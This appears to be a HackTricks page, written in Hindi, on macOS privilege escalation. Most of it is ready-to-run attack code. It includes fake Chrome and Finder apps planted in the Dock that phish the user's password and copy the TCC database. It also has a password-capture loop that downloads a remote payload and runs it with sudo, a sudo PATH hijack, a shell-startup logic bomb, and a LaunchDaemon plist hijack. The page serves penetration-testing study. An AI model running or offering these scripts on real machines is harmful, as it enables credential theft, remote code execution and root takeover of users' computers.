# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

यदि आप TCC privilege escalation के लिए यहाँ आए हैं, तो यहाँ जाएँ:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

ध्यान दें कि **Linux/Unix को प्रभावित करने वाली privilege escalation की अधिकांश tricks MacOS** machines को भी प्रभावित करेंगी। इसलिए देखें:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

आप मूल [Sudo Hijacking technique को Linux Privilege Escalation post के अंदर](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) पा सकते हैं।

हालाँकि, macOS उपयोगकर्ता का **`PATH`** तब **बनाए रखता है** जब वह **`sudo`** execute करता है। इसका अर्थ है कि इस attack को करने का एक और तरीका उन **अन्य binaries को hijack करना** होगा जिन्हें victim **sudo चलाते समय** execute करेगा:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ध्यान दें कि जो user terminal का उपयोग करता है, उसके पास **Homebrew installed होने की अत्यधिक संभावना होती है**। इसलिए **`/opt/homebrew/bin`** में binaries को hijack करना संभव है।

### Dock Impersonation

कुछ **social engineering** का उपयोग करके आप **उदाहरण के लिए Google Chrome का impersonate** करके उसे dock के अंदर दिखा सकते हैं और वास्तव में अपनी script execute कर सकते हैं:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
कुछ सुझाव:

- Dock में जाँच करें कि Chrome मौजूद है या नहीं, और यदि मौजूद हो तो उस entry को **remove** करें तथा **fake** **Chrome entry को Dock array में उसी position पर add** करें।

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
कुछ सुझाव:

- आप **Finder को Dock से हटा नहीं सकते**, इसलिए यदि आप इसे Dock में जोड़ने जा रहे हैं, तो आप fake Finder को असली Finder के ठीक बगल में रख सकते हैं। इसके लिए आपको **Dock array की शुरुआत में fake Finder entry जोड़नी होगी**।
- दूसरा विकल्प यह है कि इसे Dock में न रखें और बस इसे खोलें, "Finder asking to control Finder" इतना अजीब नहीं है।
- बिना किसी भयानक box के **बिना password पूछे root तक escalate** करने का एक और विकल्प यह है कि Finder से privileged action करने के लिए वास्तव में password पूछने को कहें:
- Finder से **`/etc/pam.d`** में एक नई **`sudo`** file copy करने को कहें (password पूछने वाला prompt बताएगा कि "Finder wants to copy sudo")
- Finder से एक नया **Authorization Plugin** copy करने को कहें (आप file name को नियंत्रित कर सकते हैं, इसलिए password पूछने वाला prompt बताएगा कि "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware अक्सर user interaction का दुरुपयोग करके **sudo-capable password को capture** करता है और उसे programmatically reuse करता है। एक सामान्य flow:

1. `whoami` से logged in user की पहचान करें।
2. **Password prompts को loop करें** जब तक `dscl . -authonly "$user" "$pw"` success return न करे।
3. Credential को cache करें (जैसे, `/tmp/.pass`) और privileged actions को `sudo -S` (password over stdin) से चलाएँ।

न्यूनतम chain का उदाहरण:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
चुराए गए password का फिर से उपयोग **`xattr -c` के साथ Gatekeeper quarantine हटाने**, LaunchDaemons या अन्य privileged files को copy करने और अतिरिक्त stages को non-interactively चलाने के लिए किया जा सकता है।

## Newer macOS-specific vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` अभी भी usable है

`AuthorizationExecuteWithPrivileges` को 10.7 में deprecated किया गया था, लेकिन यह **Sonoma/Sequoia पर अभी भी काम करता है**। कई commercial updaters untrusted path के साथ `/usr/libexec/security_authtrampoline` को invoke करते हैं। यदि target binary user-writable है, तो आप एक trojan रखकर legitimate prompt का लाभ उठा सकते हैं:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
ऊपर दिए गए **masquerading tricks** के साथ मिलाकर एक विश्वसनीय password dialog प्रस्तुत करें।


### Privileged helper / XPC triage

कई आधुनिक third-party macOS privescs एक ही pattern का पालन करते हैं: एक **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** से **Mach/XPC service** expose करता है, फिर helper या तो **client को validate नहीं करता**, उसे **बहुत देर से validate करता है** (PID race), या ऐसा **root method** expose करता है जो **user-controlled path/script** को consume करता है। यही bug class VPN clients, game launchers और updaters में पाए गए कई हालिया helper bugs के पीछे है।

त्वरित triage checklist:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
उन helpers पर विशेष ध्यान दें जो:

- `launchd` में job loaded रहने के कारण **uninstall के बाद भी** requests स्वीकार करते रहते हैं
- **`/Applications/...`** या non-root users द्वारा writable अन्य paths से scripts execute करते हैं या configuration read करते हैं
- **PID-based** या **bundle-id-only** peer validation पर निर्भर करते हैं, जिनमें race की संभावना हो सकती है

Helper authorization bugs के बारे में अधिक जानकारी के लिए [इस page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) को देखें।

### PackageKit script environment inheritance (CVE-2024-27822)

Apple द्वारा इसे **Sonoma 14.5**, **Ventura 13.6.7** और **Monterey 12.7.5** में ठीक किए जाने तक, **`Installer.app`** / **`PackageKit.framework`** के माध्यम से user-initiated installs, **PKG scripts को current user's environment के अंदर root के रूप में execute** कर सकते थे। इसका अर्थ है कि **`#!/bin/zsh`** का उपयोग करने वाला package attacker के **`~/.zshenv`** को load करके उसे **root** के रूप में run कर सकता था, जब victim उस package को install करता।

यह **logic bomb** के रूप में विशेष रूप से दिलचस्प है: आपको केवल user's account में foothold और writable shell startup file की आवश्यकता होती है, फिर आप किसी vulnerable **zsh-based** installer के user द्वारा execute किए जाने की प्रतीक्षा करते हैं। यह आम तौर पर **MDM/Munki** deployments पर लागू नहीं होता, क्योंकि वे root user's environment के अंदर run होते हैं।
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
यदि आप installer-specific abuse में और गहराई से जाना चाहते हैं, तो [इस पेज](macos-files-folders-and-binaries/macos-installers-abuse.md) को भी देखें।

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

यदि LaunchDaemon plist या उसका `ProgramArguments` target **user-writable** है, तो आप उसे बदलकर और फिर `launchd` को reload करने के लिए मजबूर करके privilege escalate कर सकते हैं:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
यह **CVE-2025-24085** के लिए प्रकाशित exploit pattern को दर्शाता है, जिसमें writable plist का दुरुपयोग करके attacker code को root के रूप में execute किया गया था।

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` में मौजूद एक **race** local attacker को threads के बीच `setgid()`/`getgid()` loops चलाकर read-only credential pointer (`proc_ro.p_ucred`) को corrupt करने देता है, जब तक कि torn `memcpy` न हो जाए। सफल corruption से **uid 0** और kernel memory access प्राप्त होता है। Minimal PoC structure:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
heap grooming के साथ मिलाकर controlled data को उस स्थान पर पहुँचाएँ जहाँ pointer दोबारा read होता है। vulnerable builds पर यह SIP bypass requirements के बिना एक विश्वसनीय **local kernel privesc** है।

### Migration assistant ("Migraine", CVE-2023-32369) के माध्यम से SIP bypass

यदि आपके पास पहले से root है, तो भी SIP system locations में writes को block करता है। **Migraine** bug Migration Assistant entitlement `com.apple.rootless.install.heritable` का दुरुपयोग करके एक child process spawn करता है, जो SIP bypass inherit करता है और protected paths (जैसे `/System/Library/LaunchDaemons`) को overwrite करता है। Chain:

1. Live system पर root प्राप्त करें।
2. Crafted state के साथ `systemmigrationd` को trigger करें ताकि वह attacker-controlled binary चलाए।
3. SIP-protected files को patch करने के लिए inherited entitlement का उपयोग करें; यह reboot के बाद भी persistence बनाए रखता है।

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

कई Apple daemons XPC के माध्यम से **NSPredicate** objects स्वीकार करते हैं और केवल `expressionType` field को validate करते हैं, जिसे attacker control कर सकता है। ऐसा predicate craft करके, जो arbitrary selectors evaluate करता हो, आप **root/system XPC services** (जैसे `coreduetd`, `contextstored`) में **code execution** प्राप्त कर सकते हैं। इसे initial app sandbox escape के साथ combine करने पर, यह **बिना user prompts के privilege escalation** प्रदान करता है। ऐसे XPC endpoints खोजें जो predicates को deserialize करते हों और जिनमें robust visitor न हो।

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass और privilege escalation

**Any user** (यहाँ तक कि unprivileged users भी) एक time machine snapshot create और mount कर सकता है और उस snapshot की **सभी files तक access** प्राप्त कर सकता है।\
आवश्यक **एकमात्र privileged access** उस application (जैसे `Terminal`) के लिए है जिसका उपयोग किया गया है, और जिसके पास **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) होना चाहिए; इसे एक admin द्वारा grant किया जाना आवश्यक है।

<details>
<summary>Time Machine snapshot mount करें</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

अधिक विस्तृत विवरण [**मूल रिपोर्ट में पाया जा सकता है**](https://theevilbit.github.io/posts/cve_2020_9771/)**।**

## संवेदनशील जानकारी

यह privileges escalate करने में उपयोगी हो सकता है:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
